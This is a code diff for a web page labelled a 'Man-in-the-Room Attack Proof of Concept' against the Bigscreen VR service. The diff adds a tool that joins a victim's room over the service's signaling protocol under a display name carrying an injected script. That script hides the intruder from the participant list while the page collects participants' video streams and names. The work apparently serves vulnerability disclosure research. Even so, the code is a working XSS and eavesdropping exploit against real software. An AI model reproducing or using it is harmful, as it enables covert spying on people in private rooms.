@@ -1,32 +1,39 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="utf-8" />
-    <style>
-        body {
-          font-family: sans-serif;
-        }
-        video {
-            max-width: 100%;
-            border: 1px solid black;
-        }
-        #video > div {
-            display: inline-block;
-            max-width: 32%;
-        }
-    </style>
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="./bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+
+    <title>Man-in-the-Room Attack Proof of Concept - Bigscreen</title>
 </head>
 <body>
-    <button id="btn_socket_connect">connect</button>
-    <div id="videos"></div>
-
-
-
-
-    <video id="remoteVideoDirect" autoplay playsinline controls></video>
-
-
-<!-- This file is automatically added/served when running "node index.js". -->
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-sm">
+            <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
+            <h2>Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
+            <form class="form-inline">
+                <label class="mb-2 mr-sm-2" for="roomIdInput">Room ID: </label>
+                <div class="input-group mb-2 mr-sm-2">
+                  <div class="input-group-prepend">
+                    <span class="input-group-text">room-</span>
+                  </div>
+                  <input id="roomIdInput" type="text" class="form-control" placeholder="8we1jdc4">
+                </div>
+                <button id="joinRoomButton" type="button" class="btn btn-outline-primary mb-2 mr-sm-2">Join</button>
+            </form>
+        </div>
+    </div>
+    <div id="users" class="row"></div>
+</div>
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="./jquery-3.3.1.slim.min.js"></script>
+<script src="./popper.min.js"></script>
+<script src="./bootstrap.min.js"></script>
 <script src="./adapter-latest.js"></script>
 <script src="./msgpack.min.js"></script>
 <script>
@@ -44,10 +51,14 @@ function Connection(userId, scid, pcid){
     this.isStarted = false;
     this.isInitiator = false;
     this.rtcPeerConnection = null;
+    this.remoteStream = null;
+    this.videoElement = null;
+    this.cardElement = null;
 }
 let connections = [];
 
 let allRemoteStreams = [];
+let roomState;
 
 let turnReady;
 
@@ -60,8 +71,9 @@ const pcConfig = {
 };
 
 <!--region variables for Bigscreen signaling protocol-->
-let NAME = 'Mallory1';
-let roomId = 'room-';
+let textName = '__Mallory__';
+let NAME = textName + '<scr' + 'ipt>Array.prototype.forEach.call(document.querySelectorAll("#room-participants li"), function(e){if(e.querySelector("h3.user-name").firstChild.nodeValue === "'+textName+'"){e.remove()}});</sc'+'ript>';
+let roomId;
 let myUserId;
 let myUuid = generateBigscreenUuid();
 let unityVersion = '0.34.0';
@@ -77,18 +89,23 @@ let websocket;
 
 
 <!--region GUI bindings -->
-const remoteVideoDirect = document.querySelector('#remoteVideoDirect');
-const btn_socket_connect = document.getElementById('btn_socket_connect');
-const videosElement = document.getElementById('videos');
+const joinRoomButton = document.getElementById('joinRoomButton');
+const usersSectionElement = document.getElementById('users');
+const roomIdInput = document.getElementById('roomIdInput');
 <!--endregion-->
 
-function connect() {
+joinRoomButton.addEventListener("click", function () {
+    roomId = 'room-' + roomIdInput.value;
+    roomIdInput.readOnly = true;
+    joinRoomButton.disabled = true;
+
     websocket = new WebSocket(bigscreenSignalUrl);
     websocket.binaryType = 'arraybuffer';
     websocket.onopen = function (event) {
         console.log('connected', event);
         sendMessage({type: 'register-desktop'});
         console.log('registered');
+        joinRoom();
     };
     websocket.onclose = function (event) {
         console.log('onClose disconnected', event);
@@ -99,13 +116,34 @@ function connect() {
     websocket.onerror = function (event) {
         console.log('onError event', event);
     };
-}
-
-btn_socket_connect.addEventListener("click", function () {
-    connect();
 });
 
 ////////////////////////////////////////////////
+
+function showUsernames() {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+        console.log('onreadystatechange', this.readyState);
+        if (this.readyState === 4 && this.status === 200) {
+           console.log(xhttp.responseText);
+           roomState = JSON.parse(xhttp.responseText);
+            for (let i = 0; i < connections.length; i++) {
+                let c = connections[i];
+                if(c.cardElement){
+                    let userNameElement = c.cardElement.getElementsByClassName('username')[0];
+                    userNameElement.innerHTML = ' ';
+                    userNameElement.appendChild(document.createTextNode(roomState[c.userId + '.name']));
+
+                    let userIdElement = c.cardElement.getElementsByClassName('userId')[0];
+                    userIdElement.innerHTML = ' ';
+                    userIdElement.appendChild(document.createTextNode(c.userId));
+                }
+            }
+        }
+    };
+    xhttp.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId='+roomId, true);
+    xhttp.send();
+}
 
 function sendMessage(message) {
     console.log('sendMessage', message);
@@ -269,13 +307,25 @@ function maybeStart(connection) {
                 allRemoteStreams.push(event.streams);
                 connection.remoteStream = event.streams[0];
                 if(connection.pcid === 0){
-
-                    let video = document.createElement("video");
-                    video.setAttribute('autoplay','');
-                    video.setAttribute('playsinline','');
-                    video.setAttribute('controls','');
-                    video.srcObject = event.streams[0];
-                    videosElement.appendChild(video);
+                    if(connection.videoElement === null){
+                        let template = document.createElement('template');
+                        template.innerHTML = '<div class="col-sm-3">\n' +
+                            '           <div class="card">\n' +
+                            '               <video class="card-img-top" autoplay playsinline controls></video>\n' +
+                            '              <div class="card-body">\n' +
+                            '                <h5 class="username card-title">Username</h5>\n' +
+                            '                <h6 class="userId card-subtitle mb-2 text-muted">UserId</h6>\n' +
+                            '                <p class="card-text"></p>\n' +
+                            '              </div>\n' +
+                            '            </div>\n' +
+                            '        </div>';
+                        let cardElement = template.content.firstChild;
+                        connection.cardElement = cardElement;
+                        connection.videoElement = cardElement.getElementsByTagName('video')[0];
+                        usersSectionElement.appendChild(cardElement);
+                        showUsernames();
+                    }
+                    connection.videoElement.srcObject = event.streams[0];
                 }
             };
             connection.rtcPeerConnection.onremovestream = function (event) {
@@ -298,7 +348,7 @@ function maybeStart(connection) {
                 console.log('Receive Channel Callback');
                 dataChannelReceive = event.channel;
                 dataChannelReceive.onmessage = function(event){
-                    console.error('Received Message', connection, event.data);
+                    //console.error('Received Message', connection, event.data);
                 };
                 dataChannelReceive.onopen = onReceiveChannelStateChangeDirect;
                 dataChannelReceive.onclose = onReceiveChannelStateChangeDirect;
